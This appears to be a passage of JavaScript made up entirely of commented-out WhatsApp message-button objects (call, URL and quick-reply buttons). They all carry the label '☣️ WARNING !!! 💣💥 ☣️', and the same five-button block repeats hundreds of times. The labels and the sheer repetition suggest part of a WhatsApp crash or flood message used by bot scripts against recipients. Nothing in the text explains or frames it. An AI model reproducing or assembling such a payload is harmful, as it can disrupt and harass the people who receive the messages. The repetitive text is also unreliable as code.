// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//    { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//    { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//    { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
